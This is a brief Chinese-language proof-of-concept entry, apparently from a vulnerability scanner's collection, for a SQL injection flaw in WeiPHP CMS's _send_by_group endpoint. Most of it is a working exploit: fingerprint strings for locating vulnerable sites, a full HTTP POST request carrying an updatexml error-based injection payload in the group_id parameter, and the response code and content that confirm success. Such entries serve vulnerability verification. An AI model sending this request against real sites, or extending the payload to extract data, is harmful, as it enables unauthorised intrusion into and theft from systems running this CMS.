﻿# weiphp cms _send_by_group sql注入漏洞

> 更新时间：2024-04-30

> 漏洞编号：

> 漏洞说明：

> 漏洞特征： body="/css/weiphp.css" || body="WeiPHP"

> 验证脚本：HTTP

```
POST /public/index.php/weixin/message/_send_by_group HTTP/1.1
Content-Type: application/x-www-form-urlencoded
group_id[0]=exp&group_id[1]=%29+and+updatexml%281%2Cconcat%280x7e%2C%28%2F%2A%2150000select%2A%2F+123456ww%29%2C0x7e%29%2C1%29+--
```

> 响应代码特征：500

> 响应内容特征：123456ww

> 上传文件定位：

> 验证文件来源：weiphp cms _send_by_group sql注入漏洞.poc

